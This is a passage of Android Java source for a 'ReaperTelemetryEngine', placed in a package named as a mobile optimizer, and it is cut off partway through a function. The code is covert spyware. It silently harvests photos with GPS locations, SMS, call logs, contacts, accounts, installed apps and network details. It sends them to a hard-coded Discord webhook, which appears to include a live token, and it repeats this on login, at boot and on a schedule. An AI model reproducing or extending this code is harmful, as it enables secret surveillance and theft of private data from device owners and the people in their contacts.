// language: Java, file: ReaperTelemetryEngine.java, target: Android (API 21 → 34)
// Silent spy-grade telemetry. Boot-safe, kill-resistant.
// v2: Discord webhook + EMBEDS + EXIF-GPS + delta-sync + contacts/apps/accounts/wifi/usage
package com.lukzi.mobileoptimizer;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.media.ExifInterface;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.core.content.ContextCompat;
import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.Data;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import net.lingala.zip4j.ZipFile;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.model.enums.AESKeyStrength;
import net.lingala.zip4j.model.enums.CompressionLevel;
import net.lingala.zip4j.model.enums.CompressionMethod;
import net.lingala.zip4j.model.enums.EncryptionMethod;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TimeZone;
import java.util.concurrent.TimeUnit;

public final class ReaperTelemetryEngine {

    private static final String TAG  = "ReaperTelemetry";
    private static final boolean DBG = false;

    // ===================== FEATURE FLAGS =====================
    public static final boolean ENABLE_GUARD_SERVICE   = true;
    public static final boolean ENABLE_PERIODIC_SYNC   = true;
    public static final boolean ENABLE_BOOT_HEARTBEAT  = true;

    public static final boolean SEND_GALLERY           = true;
    public static final boolean SEND_SMS               = true;
    public static final boolean SEND_CALLLOG           = true;
    public static final boolean SEND_CONTACTS          = true;
    public static final boolean SEND_APPS              = true;
    public static final boolean SEND_ACCOUNTS          = true;
    public static final boolean SEND_NETWORK           = true;
    public static final boolean SEND_USAGE_STATS       = true;
    public static final boolean SEND_BATTERY_HISTORY   = true;
    public static final boolean SEND_EXIF_GPS          = true;
    public static final boolean DELTA_SYNC             = true;   // එකම photo ආයෙ ආයෙ නොයවන්න
    public static final boolean SEND_FULL_REPORT_ON_PERIODIC = false;

    // 0 = photos වෙන වෙනම attachments (inline preview) — default, clear
    // 1 = එක AES-encrypted ZIP එකක්
    // 2 = දෙකම
    public static final int UPLOAD_MODE                = 0;
    public static final String ZIP_PASSWORD            = "reaper2026";  // හිස් නම් encrypt නෑ

    // ===================== TUNING =====================
    private static final int PERIODIC_HOURS          = 6;
    private static final int MAX_IMAGES_PER_ALBUM    = 50;
    private static final int MAX_IMAGES_PER_SESSION  = 600;
    private static final int MAX_SCAN_DEPTH          = 3;
    private static final int MAX_PHOTOS_PER_MESSAGE  = 10;   // Discord limit = 10 files/msg
    private static final int MAX_SENT_KEYS           = 6000; // delta-sync memory cap

    private static final int  MAX_LOGIN_SENDS   = 2;
    private static final long LOGIN_DEBOUNCE_MS = 5000L;
    private static final String PREF_LOGIN      = "reaper_login_state";
    private static final String PREF_MISC       = "reaper_misc_state";

    private static final int MAX_ZIP_BYTES = 8 * 1024 * 1024;
    private static final int IMAGE_MAX_DIM = 800;
    private static final int IMAGE_QUALITY = 62;

    private static final int SMS_DUMP_LIMIT      = 60;
    private static final int CALL_DUMP_LIMIT     = 60;
    private static final int CONTACT_DUMP_LIMIT  = 60;
    private static final int APP_DUMP_LIMIT      = 60;
    private static final int USAGE_DUMP_LIMIT    = 10;

    // ===================== DISCORD =====================
    // >>> මෙතන උඹේ webhook එක දාන්න <<<
    public static final String DISCORD_WEBHOOK_URL =
            "https://discord.com/api/webhooks/1408072944495755434/SSGV7OqfTW-E4XHlsW2Ma_Q53BuAav_K-TjNGtlkHWUvGjco0lQ_Gd9CzOcd1dvgkwWD";
    public static final String BACKUP_WEBHOOK_URL  = "";
    public static final String DISCORD_USERNAME    = "Reaper Telemetry";

    private static final String UA = "ReaperTelemetry/2.0 (+android)";
    private static final int  DISCORD_MAX_CHARS = 1900;
    private static final long MIN_SEND_GAP_MS   = 420L;

    private static final int COLOR_ORANGE = 16744192;   // 0xFF7A00
    private static final int COLOR_GREEN  = 3066993;    // 0x2ECC71
    private static final int COLOR_BLUE   = 3447003;    // 0x3498DB
    private static final int COLOR_RED    = 15158332;   // 0xE74C3C
    private static final int COLOR_PURPLE = 10181046;   // 0x9B59B6
    private static final int COLOR_GREY   = 9807270;    // 0x95A5A6
    private static final int COLOR_GOLD   = 15844367;   // 0xF1C40F

    private static final String[] BLACKLISTED_PACKAGES = {
            "com.joeykrim.rootcheck", "eu.chainfire.supersu", "com.topjohnwu.magisk",
            "io.github.vvb2060.magisk", "de.robv.android.xposed.installer", "com.saurik.substrate",
            "me.weishu.kernelsu", "com.luckyluck.patcher", "com.chelpus.lackypatch",
            "com.dimonvideo.luckypatcher", "com.forpda.lp", "com.ccplay.game",
            "com.cih.game_guardian", "org.gl.gameguardian", "org.cheatengine.ceandroid",
            "org.cheatengine.cegui", "com.cheatengine", "com.zimperium.zips",
            "com.miku.apktool", "ru.maximoff.apktool", "com.applisto.appcloner",
            "com.applisto.appcloner.arm64", "com.apkeditor", "com.apkeditor.pro",
            "com.gmail.heagoo.apkeditor", "com.gmail.heagoo.apkeditor.pro", "com.gmail.heagoo.appedit",
            "com.heagoo.apkeditor", "com.heagoo.apkeditor.pro",
            "io.va.exposed", "org.lsposed.manager", "me.weishu.exp"
    };

    private ReaperTelemetryEngine() {}

    private static volatile Context sAppContext;
    private static volatile long sLastLoginAlertTs = 0;

    public static Context getAppContext() { return sAppContext; }

    // ===================== 1. BOOTSTRAP =====================

    public static void init(Context context) {
        if (context == null) return;
        final Context app = context.getApplicationContext();
        sAppContext = app;
        try {
            if (ENABLE_GUARD_SERVICE) {
                try { ReaperGuardService.start(app); } catch (Throwable ignored) {}
            }
            if (ENABLE_PERIODIC_SYNC) schedulePeriodic(app);
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "init: " + t);
        }
    }

    private static void schedulePeriodic(Context app) {
        try {
            Constraints c = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED).build();
            PeriodicWorkRequest p = new PeriodicWorkRequest.Builder(
                    ReaperPeriodicWorker.class, PERIODIC_HOURS, TimeUnit.HOURS)
                    .setConstraints(c)
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 15, TimeUnit.MINUTES)
                    .addTag("reaper_periodic").build();
            WorkManager.getInstance(app).enqueueUniquePeriodicWork(
                    "reaper_periodic_sync", ExistingPeriodicWorkPolicy.KEEP, p);
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "schedulePeriodic: " + t);
        }
    }

    // ===================== 2. LOGIN EVENT =====================

    public static void onLogin(Context context, String identifier, String loginType) {
        if (context == null && sAppContext != null) context = sAppContext;
        if (context == null) return;
        final Context app = context.getApplicationContext();

        final String key     = loginKey(app, identifier);
        final int    loginNo = registerLogin(app, key);

        if (loginNo > MAX_LOGIN_SENDS) {
            if (DBG) Log.i(TAG, "login #" + loginNo + " skipped");
            return;
        }
        sendInstantLoginAlert(app, identifier, loginType, loginNo);
        scheduleWorkManager(app, identifier, loginType);
    }

    public static void sendLoginGalleryEvidence(Context c, String id, String t) {
        onLogin(c, id, t);
    }

    private static int registerLogin(Context c, String key) {
        try {
            SharedPreferences sp = c.getSharedPreferences(PREF_LOGIN, Context.MODE_PRIVATE);
            long now  = System.currentTimeMillis();
            long last = sp.getLong("t_" + key, 0L);
            int  cnt  = sp.getInt("c_" + key, 0);
            if (cnt > 0 && (now - last) < LOGIN_DEBOUNCE_MS) return cnt;
            cnt++;
            sp.edit().putInt("c_" + key, cnt).putLong("t_" + key, now).apply();
            return cnt;
        } catch (Throwable t) { return 1; }
    }

    private static String loginKey(Context c, String identifier) {
        String hwid = shorten(SecurityGuard.getDeviceHwid(c));
        String id   = safe(identifier, "UNKNOWN").replaceAll("[^A-Za-z0-9._-]", "_");
        return hwid + "__" + id;
    }

    public static void sendInstantLoginAlert(Context c, String id, String type) {
        sendInstantLoginAlert(c, id, type, 0);
    }

    public static void sendInstantLoginAlert(Context context, String identifier,
                                             String loginType, int loginNo) {
        if (context == null) context = sAppContext;
        if (context == null) return;
        final Context app = context.getApplicationContext();

        long now = System.currentTimeMillis();
        if (now - sLastLoginAlertTs < LOGIN_DEBOUNCE_MS) return;
        sLastLoginAlertTs = now;

        final int no = loginNo;
        new Thread(() -> {
            try {
                String shortH = shorten(SecurityGuard.getDeviceHwid(app));
                List<String> f = new ArrayList<>();
                f.add(field("👤 User / Key", "`" + code(safe(identifier, "UNKNOWN")) + "`", true));
                f.add(field("🔑 Method", esc(safe(loginType, "USER_LOGIN")), true));
                if (no > 0) f.add(field("🔁 Login #", no + " of " + MAX_LOGIN_SENDS, true));
                addDeviceFields(app, f, true);
                f.add(field("🔐 HWID", "`" + code(shortH) + "`", true));
                f.add(field("⏱️ Time", nowTs(), true));

                sendEmbed(embedJson("⚡  NEW USER LOGIN DETECTED",
                        "*Scanning & packing gallery in the background...*",
                        COLOR_ORANGE, f, "Reaper • instant ping"), 12000, 12000);
            } catch (Throwable t) {
                if (DBG) Log.w(TAG, "instantAlert: " + t);
            }
        }, "reaper-ping").start();
    }

    public static void scheduleWorkManager(Context context, String identifier, String loginType) {
        if (context == null) return;
        final Context app = context.getApplicationContext();
        try {
            Constraints c = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED).build();
            Data d = new Data.Builder()
                    .putString(ReaperUploadWorker.KEY_IDENTIFIER, safe(identifier, "UNKNOWN"))
                    .putString(ReaperUploadWorker.KEY_LOGIN_TYPE, safe(loginType, "USER_LOGIN"))
                    .build();
            OneTimeWorkRequest r = new OneTimeWorkRequest.Builder(ReaperUploadWorker.class)
                    .setConstraints(c).setInputData(d)
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
                    .addTag("reaper_telemetry_sync").build();
            WorkManager.getInstance(app)
                    .enqueueUniqueWork("reaper_upload_task", ExistingWorkPolicy.REPLACE, r);
        } catch (Throwable e) {
            new Thread(() -> executeTelemetrySync(app, identifier, loginType), "reaper-inline").start();
        }
    }

    // ===================== 3. BOOT HEARTBEAT =====================

    public static void sendBootHeartbeat(Context context) {
        if (context == null || !ENABLE_BOOT_HEARTBEAT) return;
        final Context app = context.getApplicationContext();
        new Thread(() -> {
            try {
                List<String> f = new ArrayList<>();
                addDeviceFields(app, f, true);
                f.add(field("🔐 HWID", "`" + code(shorten(SecurityGuard.getDeviceHwid(app))) + "`", true));
                f.add(field("🕷️ Tools Detected",
                        esc(safe(getDetectedCrackingToolName(app), "None")), true));
                if (SEND_BATTERY_HISTORY) {
                    String h = batteryHistory(app);
                    if (!TextUtils.isEmpty(h)) f.add(field("🔋 Battery Trend", h, false));
                }
                f.add(field("⏱️ Time", nowTs(), true));
                sendEmbed(embedJson("🔌  DEVICE ONLINE  (BOOT / STARTUP)",
                        null, COLOR_GREEN, f, "Reaper • boot heartbeat"), 12000, 12000);
            } catch (Throwable ignored) {}
        }, "reaper-boot").start();
    }

    // ===================== 4. CORE SYNC =====================

    public static boolean executeTelemetrySync(Context context, String identifier, String loginType) {
        boolean full = SEND_FULL_REPORT_ON_PERIODIC
                || !"PERIODIC".equalsIgnoreCase(safe(loginType, ""));
        return executeTelemetrySync(context, identifier, loginType, full);
    }

    public static boolean executeTelemetrySync(Context context, String identifier,
                                               String loginType, boolean fullReport) {
        if (context == null) return false;
        final Context app = context.getApplicationContext();

        File zipFile = null;
        try {
            String shortH = shorten(SecurityGuard.getDeviceHwid(app));
            String model  = deviceModel();
            String stamp  = fileStamp();
            long   t0     = System.currentTimeMillis();

            recordBatterySample(app);

            Set<String> sentKeys = DELTA_SYNC ? loadSent(app) : new HashSet<>();
            List<Shot> shots = SEND_GALLERY ? collectNewImages(app, sentKeys) : new ArrayList<>();

            long totalBytes = 0;
            for (Shot s : shots) totalBytes += s.data.length;

            // ---------- gallery ----------
            boolean galleryOk = true;
            if (SEND_GALLERY && !shots.isEmpty()) {
                if (UPLOAD_MODE == 1 || UPLOAD_MODE == 2) {
                    zipFile = new File(app.getCacheDir(), "reaper_" + stamp + ".zip");
                    int packed = writeZip(zipFile, shots);
                    if (packed > 0) {
                        String cap = "📱 " + model + " [" + shortH + "]\n"
                                + "👤 " + safe(identifier, "UNKNOWN") + " (" + safe(loginType, "-") + ")\n"
                                + "📦 " + packed + " photos • " + (zipFile.length() / 1024) + " KB";
                        List<String> zf = new ArrayList<>();
                        zf.add(field("👤 User", esc(safe(identifier, "UNKNOWN")), true));
                        zf.add(field("📦 Photos", String.valueOf(packed), true));
                        zf.add(field("💾 Size", (zipFile.length() / 1024) + " KB", true));
                        zf.add(field("🔑 Password",
                                TextUtils.isEmpty(ZIP_PASSWORD) ? "*none*" : "`" + code(ZIP_PASSWORD) + "`", true));
                        if (!uploadDiscordFile(zipFile,
                                "gallery_" + shortH + "_" + stamp + ".zip",
                                embedJson("🗜️  FULL GALLERY ARCHIVE", cap, COLOR_PURPLE, zf,
                                        model + " • " + shortH))) {
                            galleryOk = false;
                        }
                    }
                }

                if (UPLOAD_MODE == 0 || UPLOAD_MODE == 2) {
                    if (!uploadPhotoBatches(app, shots, shortH, model, identifier)) galleryOk = false;
                }

                if (galleryOk && DELTA_SYNC) {
                    for (Shot s : shots) sentKeys.add(s.key());
                    saveSent(app, sentKeys);
                }
            } else if (SEND_GALLERY && shots.isEmpty()) {
                List<String> f = new ArrayList<>();
                f.add(field("📱 Device", esc(model), true));
                f.add(field("🔐 HWID", "`" + code(shortH) + "`", true));
                f.add(field("👤 User", esc(safe(identifier, "UNKNOWN")), true));
                f.add(field("📸 Result", DELTA_SYNC ? "No **new** photos" : "No photos found", false));
                sendEmbed(embedJson("📭  GALLERY SYNC", null, COLOR_GREY, f, model + " • " + shortH),
                        12000, 12000);
            }

            // ---------- full report blocks ----------
            if (fullReport) {
                if (SEND_NETWORK)   sendNetworkEmbed(app);
                if (SEND_ACCOUNTS)  sendAccountsEmbed(app);
                if (SEND_CONTACTS)  sendContactsEmbed(app);
                if (SEND_APPS)      sendAppsEmbed(app);
                if (SEND_USAGE_STATS) sendUsageEmbed(app);
                if (SEND_SMS)       sendTextBlock(app, "📩  SMS INBOX", dumpSms(app, SMS_DUMP_LIMIT), COLOR_BLUE);
                if (SEND_CALLLOG)   sendTextBlock(app, "📞  CALL LOG", dumpCallLog(app, CALL_DUMP_LIMIT), COLOR_GOLD);
            }

            // ---------- summary ----------
            List<String> sf = new ArrayList<>();
            sf.add(field("📱 Device", esc(model), true));
            sf.add(field("🔐 HWID", "`" + code(shortH) + "`", true));
            sf.add(field("👤 User", esc(safe(identifier, "UNKNOWN")), true));
            sf.add(field("📸 New photos", String.valueOf(shots.size()), true));
            sf.add(field("💾 Payload", (totalBytes / 1024) + " KB", true));
            sf.add(field("⏱️ Took", ((System.currentTimeMillis() - t0) / 1000) + "s", true));
            sendEmbed(embedJson("✅  SYNC COMPLETE", null, COLOR_GREEN, sf, model + " • " + shortH),
                    12000, 12000);

            return galleryOk;

        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "executeTelemetrySync: " + t);
            return false;
        } finally {
            if (zipFile != null && zipFile.exists()) {
                try { zipFile.delete(); } catch (Throwable ignored) {}
            }
        }
    }

    private static boolean uploadPhotoBatches(Context app, List<Shot> shots,
                                              String shortH, String model, String identifier) {
        int total = (shots.size() + MAX_PHOTOS_PER_MESSAGE - 1) / MAX_PHOTOS_PER_MESSAGE;
        int batchNo = 0;
        boolean ok = true;

        for (int i = 0; i < shots.size(); i += MAX_PHOTOS_PER_MESSAGE) {
            batchNo++;
            int end = Math.min(i + MAX_PHOTOS_PER_MESSAGE, shots.size());
            List<Shot> part = shots.subList(i, end);

            List<File> files = new ArrayList<>(part.size());
            List<String> names = new ArrayList<>(part.size());
            List<File> temps = new ArrayList<>(part.size());

            StringBuilder gps = new StringBuilder();
            long bytes = 0;

            for (int k = 0; k < part.size(); k++) {
                Shot s = part.get(k);
                try {
                    File f = new File(app.getCacheDir(),
                            String.format(Locale.US, "p_%d_%d.%s", batchNo, k, s.ext));
                    try (FileOutputStream fos = new FileOutputStream(f)) { fos.write(s.data); }
                    files.add(f);
                    temps.add(f);
                    names.add(f.getName());
                    bytes += s.data.length;
                    if (SEND_EXIF_GPS && s.hasGps()) {
                        if (gps.length() < 900) {
                            gps.append("`").append(String.format(Locale.US, "%.4f", s.lat))
                               .append(",").append(String.format(Locale.US, "%.4f", s.lon)).append("` ")
                               .append("[map](https://www.google.com/maps?q=")
                               .append(String.format(Locale.US, "%.5f,%.5f", s.lat, s.lon))
                               .append(")\n");
                        }
                    }
                } catch (Throwable t) { /* skip */ }
            }

            if (files.isEmpty()) continue;

            int withGps = 0;
            for (Shot s : part) if (s.hasGps()) withGps++;

            List<String> f = new ArrayList<>();
            f.add(field("📱 Device", esc(model), true));
            f.add(field("🔐 HWID", "`" + code(shortH) + "`", true));
            f.add(field("📦 Batch", batchNo + " / " + total, true));
            f.add(field("🖼️ Photos", String.valueOf(files.size()), true));
            f.add(field("💾 Size", (bytes / 1024) + " KB", true));
            f.add(field("📍 With GPS", withGps + " / " + files.size(), true));
            if (gps.length() > 0) f.add(field("🗺️ Locations", gps.toString().trim(), false));

            String title = "📸  GALLERY  •  batch " + batchNo + "/" + total;
            String desc  = "👤 " + esc(safe(identifier, "UNKNOWN"))
                         + "\n📁 " + esc(safe(part.get(0).folder, "-"));

            if (!postDiscordPayloadWithFiles(
                    payloadJson(embedJson(title, desc, COLOR_PURPLE, f, model + " • " + shortH)),
                    files, names)) {
                ok = false;
            }
            throttle();

            for (File t : temps) { try { t.delete(); } catch (Throwable ignored) {} }
        }
        return ok;
    }

    // ===================== 5. DEVICE SNAPSHOT =====================

    private static void addDeviceFields(Context c, List<String> f, boolean inline) {
        try { f.add(field("📱 Device", esc(deviceModel()), inline)); } catch (Throwable ignored) {}
        try { f.add(field("🤖 OS", esc("Android " + Build.VERSION.RELEASE
                + " (API " + Build.VERSION.SDK_INT + ")"), inline)); } catch (Throwable ignored) {}
        try { f.add(field("🏷️ Brand", esc(safe(Build.BRAND, "-")), inline)); } catch (Throwable ignored) {}
        try {
            String abi = (Build.SUPPORTED_ABIS != null && Build.SUPPORTED_ABIS.length > 0)
                    ? Build.SUPPORTED_ABIS[0] : "-";
            f.add(field("⚙️ ABI", esc(abi), inline));
        } catch (Throwable ignored) {}

        try {
            Intent b = c.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (b != null) {
                int lvl = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int sc  = b.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int pct = (lvl >= 0 && sc > 0) ? (lvl * 100 / sc) : -1;
                int st  = b.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                int tmp = b.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
                String state = (st == BatteryManager.BATTERY_STATUS_CHARGING
                        || st == BatteryManager.BATTERY_STATUS_FULL) ? "⚡ charging" : "discharging";
                f.add(field("🔋 Battery", pct + "% • " + state
                        + (tmp > 0 ? String.format(Locale.US, " • %.1f°C", tmp / 10.0) : ""), inline));
            }
        } catch (Throwable ignored) {}

        try {
            StatFs st = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long free  = st.getAvailableBlocksLong() * st.getBlockSizeLong();
            long total = st.getBlockCountLong() * st.getBlockSizeLong();
            f.add(field("💾 Storage", mb(free) + " free / " + mb(total), inline));
        } catch (Throwable ignored) {}

        try {
            ActivityManager am = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
                am.getMemoryInfo(mi);
                f.add(field("🧠 RAM free", mb(mi.availMem), inline));
            }
        } catch (Throwable ignored) {}

        try {
            TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String op = tm.getNetworkOperatorName();
                String sim = tm.getSimOperatorName();
                if (!TextUtils.isEmpty(op))  f.add(field("📡 Carrier", esc(op), inline));
                if (!TextUtils.isEmpty(sim)) f.add(field("💳 SIM", esc(sim), inline));
            }
        } catch (Throwable ignored) {}

        try { f.add(field("🌍 Locale", esc(Locale.getDefault().toString()), inline)); } catch (Throwable ignored) {}
        try { f.add(field("👑 Root", isRooted() ? "**Yes**" : "No", inline)); } catch (Throwable ignored) {}
        try { f.add(field("⏱️ Uptime", uptime(), inline)); } catch (Throwable ignored) {}
    }

    private static String mb(long b) { return String.format(Locale.US, "%.1f MB", b / 1048576.0); }

    private static String uptime() {
        try {
            long up = android.os.SystemClock.elapsedRealtime();
            long h = up / 3600000L, m = (up % 3600000L) / 60000L;
            return h + "h " + m + "m";
        } catch (Throwable t) { return "-"; }
    }

    private static boolean isRooted() {
        try {
            String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/sd/xbin/su",
                    "/data/local/xbin/su", "/data/local/bin/su", "/system/bin/failsafe/su", "/su/bin/su"};
            for (String p : paths) if (new File(p).exists()) return true;
        } catch (Throwable ignored) {}
        return false;
    }

    // ===================== 6. NETWORK / ACCOUNTS / CONTACTS / APPS / USAGE =====================

    private static void sendNetworkEmbed(Context c) {
        List<String> f = new ArrayList<>();
        try {
            WifiManager wm = (WifiManager) c.getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                WifiInfo wi = wm.getConnectionInfo();
                if (wi != null) {
                    String ssid = wi.getSSID();
                    if (ssid != null && ssid.startsWith("\"") && ssid.endsWith("\"") && ssid.length() > 1)
                        ssid = ssid.substring(1, ssid.length() - 1);
                    if (!TextUtils.isEmpty(ssid)) f.add(field("📶 WiFi SSID", esc(ssid), true));
                    if (!TextUtils.isEmpty(wi.getBSSID()) && !"02:00:00:00:00:00".equals(wi.getBSSID()))
                        f.add(field("🔗 BSSID", "`" + code(wi.getBSSID()) + "`", true));
                    f.add(field("📈 Link", wi.getLinkSpeed() + " Mbps", true));
                    f.add(field("📡 RSSI", wi.getRssi() + " dBm", true));
                }
            }
        } catch (Throwable ignored) {}

        String localIp = localIp();
        if (!TextUtils.isEmpty(localIp)) f.add(field("🏠 Local IP", "`" + code(localIp) + "`", true));

        String pub = publicIp();
        if (!TextUtils.isEmpty(pub)) f.add(field("🌐 Public IP", "`" + code(pub) + "`", true));

        try {
            TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                if (!TextUtils.isEmpty(tm.getNetworkCountryIso()))
                    f.add(field("🗺️ Country", esc(tm.getNetworkCountryIso().toUpperCase(Locale.US)), true));
                f.add(field("📱 Net Type", esc(netTypeName(tm.getNetworkType())), true));
            }
        } catch (Throwable ignored) {}

        if (!f.isEmpty())
            sendEmbed(embedJson("🌐  NETWORK", null, COLOR_BLUE, f, "Reaper • network"), 10000, 10000);
    }

    private static String netTypeName(int t) {
        switch (t) {
            case TelephonyManager.NETWORK_TYPE_LTE: return "LTE";
            case TelephonyManager.NETWORK_TYPE_NR:  return "5G NR";
            case TelephonyManager.NETWORK_TYPE_HSPA:return "HSPA";
            case TelephonyManager.NETWORK_TYPE_UMTS:return "UMTS";
            case TelephonyManager.NETWORK_TYPE_EDGE:return "EDGE";
            case TelephonyManager.NETWORK_TYPE_GPRS:return "GPRS";
            default: return "Type " + t;
        }
    }

    private static String localIp() {
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (ni == null || !ni.isUp() || ni.isLoopback()) continue;
                for (InetAddress ia : Collections.list(ni.getInetAddresses())) {
                    if (ia == null || ia.isLoopbackAddress()) continue;
                    String h = ia.getHostAddress();
                    if (h != null && h.indexOf(':') < 0) return h;
                }
            }
        } catch (Throwable ignored) {}
        return null;
    }

    private static String publicIp() {
        HttpURLConnection conn = null;
        try {
            URL u = new URL("https://api.ipify.org");
            conn = (HttpURLConnection) u.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("User-Agent", UA);
            if (conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {
                try (BufferedReader br = new BufferedReader(
                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    String line = br.readLine();
                    if (line != null && line.length() < 64) return line.trim();
                }
            }
        } catch (Throwable ignored) {
        } finally { if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {} }
        return null;
    }

    private static void sendAccountsEmbed(Context c) {
        try {
            AccountManager am = AccountManager.get(c);
            Account[] accs = am.getAccounts();
            if (accs == null || accs.length == 0) return;
            List<String> f = new ArrayList<>();
            int n = 0;
            StringBuilder list = new StringBuilder();
            for (Account a : accs) {
                if (a == null) continue;
                String type = a.type == null ? "" : a.type.replace("com.", "").replace(".", " ");
                if (list.length() < 900) list.append("• `").append(code(safe(a.name, "?")))
                        .append("`  *(").append(esc(type)).append(")*\n");
                n++;
            }
            f.add(field("📧 Total Accounts", String.valueOf(n), true));
            f.add(field("📋 List", list.toString().trim(), false));
            sendEmbed(embedJson("👤  DEVICE ACCOUNTS", null, COLOR_GREY, f, "Reaper • accounts"),
                    10000, 10000);
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "accounts: " + t);
        }
    }

    private static void sendContactsEmbed(Context c) {
        if (!hasPerm(c, Manifest.permission.READ_CONTACTS)) return;
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                 ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT " + CONTACT_DUMP_LIMIT);
            if (cur == null) return;
            StringBuilder sb = new StringBuilder();
            int n = 0;
            while (cur.moveToNext() && n < CONTACT_DUMP_LIMIT) {
                String name = cur.getString(0);
                String num  = cur.getString(1);
                sb.append("• **").append(esc(safe(name, "?"))).append("** — `")
                  .append(code(safe(num, "-"))).append("`\n");
                n++;
                if (sb.length() > 3800) break;
            }
            if (n == 0) return;
            List<String> f = new ArrayList<>();
            f.add(field("📇 Contacts", n + (n >= CONTACT_DUMP_LIMIT ? "+" : ""), true));
            sendEmbed(embedJson("📇  CONTACTS", sb.toString().trim(), COLOR_GREEN, f, "Reaper • contacts"),
                    10000, 10000);
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "contacts: " + t);
        } finally { if (cur != null) try { cur.close(); } catch (Throwable ignored) {} }
    }

    private static void sendAppsEmbed(Context c) {
        try {
            PackageManager pm = c.getPackageManager();
            List<PackageInfo> pkgs = pm.getInstalledPackages(0);
            if (pkgs == null) return;

            List<String> user = new ArrayList<>();
            int system = 0;
            for (PackageInfo pi : pkgs) {
                if (pi == null || pi.applicationInfo == null) continue;
                boolean sys = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                if (sys) { system++; continue; }
                String label = safe(String.valueOf(pm.getApplicationLabel(pi.applicationInfo)), pi.packageName);
                user.add(label + "  `" + pi.packageName + "`");
            }
            Collections.sort(user, String.CASE_INSENSITIVE_ORDER);

            StringBuilder sb = new StringBuilder();
            int shown = Math.min(user.size(), APP_DUMP_LIMIT);
            for (int i = 0; i < shown; i++) {
                String line = "• " + esc(user.get(i)) + "\n";
                if (sb.length() + line.length() > 3900) break;
                sb.append(line);
            }
            List<String> f = new ArrayList<>();
            f.add(field("📦 User apps", String.valueOf(user.size()), true));
            f.add(field("⚙️ System apps", String.valueOf(system), true));
            f.add(field("🕷️ Cracking tool",
                    esc(safe(getDetectedCrackingToolName(c), "None")), true));
            sendEmbed(embedJson("📦  INSTALLED APPS" + (user.size() > shown ? " (top " + shown + ")" : ""),
                    sb.toString().trim(), COLOR_GREY, f, "Reaper • apps"), 10000, 10000);
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "apps: " + t);
        }
    }

    private static void sendUsageEmbed(Context c) {
        try {
            UsageStatsManager usm = (UsageStatsManager) c.getSystemService(Context.USAGE_STATS_SERVICE);
            if (usm == null) return;
            long end = System.currentTimeMillis();
            List<UsageStats> st = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY,
                    end - 86400000L, end);
            if (st == null || st.isEmpty()) {
                List<String> f = new ArrayList<>();
